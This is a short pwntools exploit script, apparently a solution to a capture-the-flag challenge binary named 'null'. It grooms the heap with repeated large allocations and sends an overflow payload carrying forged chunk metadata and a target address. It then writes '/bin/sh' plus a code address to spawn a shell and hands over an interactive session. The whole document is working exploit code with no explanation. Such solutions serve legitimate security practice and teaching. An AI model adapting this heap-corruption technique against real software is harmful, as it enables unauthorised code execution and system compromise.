from pwn import *
def cmd(c):
	p.sendlineafter("(0/1): ",str(c))
def add(size,pad,c=""):
	p.sendlineafter("Action: ",str(1))
	p.sendlineafter("Size: ",str(size))
	p.sendlineafter("blocks: ",str(pad))
def pad(n,m=1000):
	for x in range(n):
		add(0x4000,m)
		cmd(0)
context.log_level='debug'
p=process('./null')
p.sendafter("assword: \n","i'm ready for challenge\n")
pad(12)
pad(1,260)
add(0x4000,1)
cmd(1)
p.sendafter("Input: ","A"*0x3fff)
p.send("A"+"A"*8+p64(0x21)+'\x00'*0x10+p64(0)*4+p64(0x0000000300000000)+p64(0)*5+p64(0x60202d-0x10))
add(0x68,0)
cmd(1)
p.sendafter("Input: ","/bin/sh".ljust(11,'\x00')+p64(0x000000000400E4D).ljust(0xff,'\x00'))
p.interactive()
